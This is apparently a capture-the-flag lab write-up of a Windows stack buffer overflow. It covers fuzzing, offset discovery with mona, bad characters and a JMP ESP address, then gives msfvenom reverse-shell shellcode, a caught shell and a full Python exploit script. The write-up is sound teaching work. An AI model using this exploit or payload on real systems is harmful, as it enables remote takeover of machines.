# Buffer Overflow (Task 2)
## Table of Contents 
* [Fuzz the App](#fuzz-the-app)
* [Find the EIP Register](#find-the-eip-register)
* [Identify Bad Characters](#identify-bad-characters)
  * [Repeat Me](#repeat-me)
  * [Gotchas](#gotchas)
* [Find a JMP Instruction](#find-a-jmp-instruction)
* [Generate a Payload](#generate-a-payload)
* [Send the Exploit](#send-the-exploit)
  * [Exploit](#exploit)

## Fuzz the App
```bash
TARGET=10.10.111.223
```
```bash
cd exploits
vim fuzzer.py # edit IP variable
python fuzzer.py

# output
[*] Fuzzing: 10.10.111.223
[+] Sent: 100 bytes
[+] Sent: 200 bytes
[+] Sent: 300 bytes
[+] Sent: 400 bytes
[+] Sent: 500 bytes
[+] Sent: 600 bytes
[+] Sent: 700 bytes
[!] Failed to connect.
```

## Find the EIP Register
On this step, I had to infer where the EIP register was usin the ESP register. In the end, EIP was four bytes less than the offset (that reached ESP) found by mona.py. See below.

```bash
msf-pattern_create -l 1100 

# output
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk
```

```bash
vim exploit.py # PAYLOAD: (output above)
```

```bash
!mona findmsp -distance 1100

# output
0BADF00D   [+] Command used:
0BADF00D   !mona findmsp -distance 1100
0BADF00D   [+] Looking for cyclic pattern in memory
75380000   Modules C:\Windows\System32\wshtcpip.dll
0BADF00D       Cyclic pattern (normal) found at 0x005e394a (length 1100 bytes)
0BADF00D       Cyclic pattern (normal) found at 0x005e4d7a (length 1100 bytes)
0BADF00D       Cyclic pattern (normal) found at 0x01bdf7b2 (length 1100 bytes)
0BADF00D   [+] Examining registers
0BADF00D       ESP (0x01bdfa30) points at offset 638 in normal pattern (length 462) # <--- OFFSET is 638?
0BADF00D       EBP contains normal pattern : 0x41307641 (offset 630)
0BADF00D       EBX contains normal pattern : 0x39754138 (offset 626)
0BADF00D   [+] Examining SEH chain
0BADF00D   [+] Examining stack (+- 1100 bytes) - looking for cyclic pattern
0BADF00D       Walking stack from 0x01bdf5e4 to 0x01bdfe80 (0x0000089c bytes)
0BADF00D       0x01bdf7b4 : Contains normal cyclic pattern at ESP-0x27c (-636) : offset 2, length 1098 (-> 0x01bdfbfd : ESP+0x1ce)
0BADF00D   [+] Examining stack (+- 1100 bytes) - looking for pointers to cyclic pattern
0BADF00D       Walking stack from 0x01bdf5e4 to 0x01bdfe80 (0x0000089c bytes)
0BADF00D       0x01bdf6e4 : Pointer into normal cyclic pattern at ESP-0x34c (-844) : 0x01bdf7d0 : offset 30, length 1070
0BADF00D       0x01bdf6f4 : Pointer into normal cyclic pattern at ESP-0x33c (-828) : 0x01bdf7d0 : offset 30, length 1070
0BADF00D   [+] Preparing output file 'findmsp.txt'
0BADF00D       - (Re)setting logfile findmsp.txt
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:06.849000
```

```bash
vim exploit.py # OFFSET: 638, PAYLOAD: "", RETN: "BBBB"
```

```bash
python exploit.py

# output
[*] Attacking: 10.10.111.223
[+] Sent exploit. # "BBBB" was in ESP; EIP was filled with "AAAA"
```

```bash
vim exploit.py # OFFSET: 634, PAYLOAD: "", RETN: "BBBB"
```

```bash
python exploit.py

# output
[*] Attacking: 10.10.111.223
[+] Sent exploit. # "BBBB" was in EIP! OFFSET really is 634
```

## Identify Bad Characters
```bash
bytearray 

# output
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

```bash
vim exploit.py # PAYLOAD: (output above)
```

```bash
!mona bytearray -b "\x00"

# output
0BADF00D   [+] Command used:
0BADF00D   !mona bytearray -b "\x00"
0BADF00D    *** Note: parameter -b has been deprecated and replaced with -cpb ***
0BADF00D   Generating table, excluding 1 bad chars...
0BADF00D   Dumping table to file
0BADF00D   [+] Preparing output file 'bytearray.txt'
0BADF00D       - Creating working folder c:\mona\oscp
0BADF00D       - Folder created
0BADF00D       - (Re)setting logfile c:\mona\oscp\bytearray.txt
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
0BADF00D
0BADF00D   Done, wrote 255 bytes to file c:\mona\oscp\bytearray.txt
0BADF00D   Binary output saved in c:\mona\oscp\bytearray.bin
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00.016000
```

```bash
!mona compare -f C:\mona\oscp\bytearray.bin -a 0x0190fa30

# output
mona Memory comparison results
Address                    Status                     BadChars                   Type                       Location
0x0190fa30                 Corruption after 34 bytes  00 23 24 3c 3d 83 84 ba b  normal                     Stack
```

## Find a JMP Instruction
```bash
!mona jmp -r esp -cpb "\x00\x23\x3c\x83\xba"

# output
0BADF00D   [+] Command used:
0BADF00D   !mona jmp -r esp -cpb "\x00\x23\x3c\x83\xba"

0BADF00D   [+] Processing arguments and criteria
0BADF00D       - Pointer access level : X
0BADF00D       - Bad char filter will be applied to pointers : "\x00\x23\x3c\x83\xba"
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D   [+] Querying 2 modules
0BADF00D       - Querying module essfunc.dll
0BADF00D       - Querying module oscp.exe
0BADF00D       - Search complete, processing results
0BADF00D   [+] Preparing output file 'jmp.txt'
0BADF00D       - (Re)setting logfile c:\mona\oscp\jmp.txt
0BADF00D   [+] Writing results to c:\mona\oscp\jmp.txt
0BADF00D       - Number of pointers of type 'jmp esp' : 9
0BADF00D   [+] Results :
625011AF     0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False... # <--- USING THIS ONE
625011BB     0x625011bb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False...
625011C7     0x625011c7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False...
625011D3     0x625011d3 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False...
625011DF     0x625011df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False...
625011EB     0x625011eb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False...
625011F7     0x625011f7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False...
62501203     0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False...
62501205     0x62501205 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False...
0BADF00D       Found a total of 9 pointers
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00.265000
```

```bash
vim exploit.py # RETN: "\xaf\x11\x50\x62"
```

## Generate a Payload

USE YOUR IP ADDRESS FOR THE LHOST!
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.224.177 LPORT=443 -f python -v PAYLOAD EXITFUNC=thread -b "\x00\x23\x3c\x83\xba"

# output
PAYLOAD =  b""
PAYLOAD += b"\xfc\xbb\xcc\xfa\xd6\x3b\xeb\x0c\x5e\x56\x31\x1e"
PAYLOAD += b"\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff"
PAYLOAD += b"\xff\x30\x12\x54\x3b\xc8\xe3\x39\xb5\x2d\xd2\x79"
PAYLOAD += b"\xa1\x26\x45\x4a\xa1\x6a\x6a\x21\xe7\x9e\xf9\x47"
PAYLOAD += b"\x20\x91\x4a\xed\x16\x9c\x4b\x5e\x6a\xbf\xcf\x9d"
PAYLOAD += b"\xbf\x1f\xf1\x6d\xb2\x5e\x36\x93\x3f\x32\xef\xdf"
PAYLOAD += b"\x92\xa2\x84\xaa\x2e\x49\xd6\x3b\x37\xae\xaf\x3a"
PAYLOAD += b"\x16\x61\xbb\x64\xb8\x80\x68\x1d\xf1\x9a\x6d\x18"
PAYLOAD += b"\x4b\x11\x45\xd6\x4a\xf3\x97\x17\xe0\x3a\x18\xea"
PAYLOAD += b"\xf8\x7b\x9f\x15\x8f\x75\xe3\xa8\x88\x42\x99\x76"
PAYLOAD += b"\x1c\x50\x39\xfc\x86\xbc\xbb\xd1\x51\x37\xb7\x9e"
PAYLOAD += b"\x16\x1f\xd4\x21\xfa\x14\xe0\xaa\xfd\xfa\x60\xe8"
PAYLOAD += b"\xd9\xde\x29\xaa\x40\x47\x94\x1d\x7c\x97\x77\xc1"
PAYLOAD += b"\xd8\xdc\x9a\x16\x51\xbf\xf2\xdb\x58\x3f\x03\x74"
PAYLOAD += b"\xea\x4c\x31\xdb\x40\xda\x79\x94\x4e\x1d\x7d\x8f"
PAYLOAD += b"\x37\xb1\x80\x30\x48\x98\x46\x64\x18\xb2\x6f\x05"
PAYLOAD += b"\xf3\x42\x8f\xd0\x54\x12\x3f\x8b\x14\xc2\xff\x7b"
PAYLOAD += b"\xfd\x08\xf0\xa4\x1d\x33\xda\xcc\xb4\xce\x8d\xf8"
PAYLOAD += b"\x40\x30\xfc\x95\x52\xb0\xfe\xde\xda\x56\x6a\x31"
PAYLOAD += b"\x8b\xc1\x03\xa8\x96\x99\xb2\x35\x0d\xe4\xf5\xbe"
PAYLOAD += b"\xa2\x19\xbb\x36\xce\x09\x2c\xb7\x85\x73\xfb\xc8"
PAYLOAD += b"\x33\x1b\x67\x5a\xd8\xdb\xee\x47\x77\x8c\xa7\xb6"
PAYLOAD += b"\x8e\x58\x5a\xe0\x38\x7e\xa7\x74\x02\x3a\x7c\x45"
PAYLOAD += b"\x8d\xc3\xf1\xf1\xa9\xd3\xcf\xfa\xf5\x87\x9f\xac"
PAYLOAD += b"\xa3\x71\x66\x07\x02\x2b\x30\xf4\xcc\xbb\xc5\x36"
PAYLOAD += b"\xcf\xbd\xc9\x12\xb9\x21\x7b\xcb\xfc\x5e\xb4\x9b"
PAYLOAD += b"\x08\x27\xa8\x3b\xf6\xf2\x68\x5b\x15\xd6\x84\xf4"
PAYLOAD += b"\x80\xb3\x24\x99\x32\x6e\x6a\xa4\xb0\x9a\x13\x53"
PAYLOAD += b"\xa8\xef\x16\x1f\x6e\x1c\x6b\x30\x1b\x22\xd8\x31"
PAYLOAD += b"\x0e\x22\xde\xcd\xb1"
```

```bash
vim exploit.py # PAYLOAD: (output above), PADDING: "\x90" * 16
```

## Send the Exploit
```bash
python exploit.py

# output
[*] Attacking: 10.10.111.223
[+] Sent exploit.
```

```bash
sudo nc -nvlp 443

# output
listening on [any] 443 ...
connect to [10.8.224.177] from (UNKNOWN) [10.10.111.223] 49204
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\admin\Desktop\vulnerable-apps\oscp>
```

### Exploit
```python
#!/usr/bin/env python3

import socket

IP = "10.10.111.223" # change me
PORT = 1337 # change me
TARGET = (IP,PORT)
PREFIX = "OVERFLOW2 " # change me; vulnerable function of target
OFFSET = 634 # change me; fuzz the target to determine the correct value
OVERFLOW = "A" * OFFSET # bogus chars that will preceed the 
RETN = "\xbb\x11\x50\x62" # address of a JMP instruction, in Little Endian
PADDING = "\x90" * 16 # so the msfvenom encoder does not overwrite itself
BADCHARS = "\x00\x23\x3c\x83\xba" # exclude these from your shellcode
# msfvenom -p windows/shell_reverse_tcp LHOST=10.8.224.177 LPORT=443 -f python -v PAYLOAD EXITFUNC=thread -b "\x00\x23\x3c\x83\xba"
PAYLOAD =  b""
PAYLOAD += b"\xfc\xbb\xcc\xfa\xd6\x3b\xeb\x0c\x5e\x56\x31\x1e"
PAYLOAD += b"\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff"
PAYLOAD += b"\xff\x30\x12\x54\x3b\xc8\xe3\x39\xb5\x2d\xd2\x79"
PAYLOAD += b"\xa1\x26\x45\x4a\xa1\x6a\x6a\x21\xe7\x9e\xf9\x47"
PAYLOAD += b"\x20\x91\x4a\xed\x16\x9c\x4b\x5e\x6a\xbf\xcf\x9d"
PAYLOAD += b"\xbf\x1f\xf1\x6d\xb2\x5e\x36\x93\x3f\x32\xef\xdf"
PAYLOAD += b"\x92\xa2\x84\xaa\x2e\x49\xd6\x3b\x37\xae\xaf\x3a"
PAYLOAD += b"\x16\x61\xbb\x64\xb8\x80\x68\x1d\xf1\x9a\x6d\x18"
PAYLOAD += b"\x4b\x11\x45\xd6\x4a\xf3\x97\x17\xe0\x3a\x18\xea"
PAYLOAD += b"\xf8\x7b\x9f\x15\x8f\x75\xe3\xa8\x88\x42\x99\x76"
PAYLOAD += b"\x1c\x50\x39\xfc\x86\xbc\xbb\xd1\x51\x37\xb7\x9e"
PAYLOAD += b"\x16\x1f\xd4\x21\xfa\x14\xe0\xaa\xfd\xfa\x60\xe8"
PAYLOAD += b"\xd9\xde\x29\xaa\x40\x47\x94\x1d\x7c\x97\x77\xc1"
PAYLOAD += b"\xd8\xdc\x9a\x16\x51\xbf\xf2\xdb\x58\x3f\x03\x74"
PAYLOAD += b"\xea\x4c\x31\xdb\x40\xda\x79\x94\x4e\x1d\x7d\x8f"
PAYLOAD += b"\x37\xb1\x80\x30\x48\x98\x46\x64\x18\xb2\x6f\x05"
PAYLOAD += b"\xf3\x42\x8f\xd0\x54\x12\x3f\x8b\x14\xc2\xff\x7b"
PAYLOAD += b"\xfd\x08\xf0\xa4\x1d\x33\xda\xcc\xb4\xce\x8d\xf8"
PAYLOAD += b"\x40\x30\xfc\x95\x52\xb0\xfe\xde\xda\x56\x6a\x31"
PAYLOAD += b"\x8b\xc1\x03\xa8\x96\x99\xb2\x35\x0d\xe4\xf5\xbe"
PAYLOAD += b"\xa2\x19\xbb\x36\xce\x09\x2c\xb7\x85\x73\xfb\xc8"
PAYLOAD += b"\x33\x1b\x67\x5a\xd8\xdb\xee\x47\x77\x8c\xa7\xb6"
PAYLOAD += b"\x8e\x58\x5a\xe0\x38\x7e\xa7\x74\x02\x3a\x7c\x45"
PAYLOAD += b"\x8d\xc3\xf1\xf1\xa9\xd3\xcf\xfa\xf5\x87\x9f\xac"
PAYLOAD += b"\xa3\x71\x66\x07\x02\x2b\x30\xf4\xcc\xbb\xc5\x36"
PAYLOAD += b"\xcf\xbd\xc9\x12\xb9\x21\x7b\xcb\xfc\x5e\xb4\x9b"
PAYLOAD += b"\x08\x27\xa8\x3b\xf6\xf2\x68\x5b\x15\xd6\x84\xf4"
PAYLOAD += b"\x80\xb3\x24\x99\x32\x6e\x6a\xa4\xb0\x9a\x13\x53"
PAYLOAD += b"\xa8\xef\x16\x1f\x6e\x1c\x6b\x30\x1b\x22\xd8\x31"
PAYLOAD += b"\x0e\x22\xde\xcd\xb1"
SUFFIX = "" 
EXPLOIT = PREFIX + OVERFLOW + RETN + PADDING + PAYLOAD + SUFFIX

print("[*] Attacking: %s" % IP)
try:
    CLIENT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    CLIENT.settimeout(3)
    CLIENT.connect(TARGET)
    CLIENT.send(EXPLOIT)
    CLIENT.recv(1024)
    CLIENT.close()
    print("[+] Sent exploit.")
except socket.error as ERROR:
    print("[!] Failed to connect.")
    exit()
```
